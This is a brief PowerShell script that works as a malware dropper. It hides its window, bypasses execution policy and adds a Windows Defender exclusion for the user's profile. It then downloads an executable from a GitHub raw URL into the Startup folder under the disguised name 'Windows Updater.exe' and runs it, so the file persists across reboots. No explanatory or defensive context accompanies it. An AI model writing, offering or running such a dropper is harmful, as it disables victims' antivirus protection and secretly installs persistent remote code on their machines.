$userDirectory = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$fileUrl = "https://raw.githubusercontent.com/MRvinyKing/pythonwgetfilestest/main/updater.exe"
$startupFilePath = "$userDirectory\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.exe"
$downloadCommand = "Invoke-WebRequest -Uri '$fileUrl' -OutFile '$startupFilePath'"
$exclusionCommand = "Add-MpPreference -ExclusionPath '$userDirectory'"
$startupCommand = "Start-Process '$startupFilePath'"
Start-Process powershell -Verb -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `$($exclusionCommand); `$($downloadCommand); `$($startupCommand)"
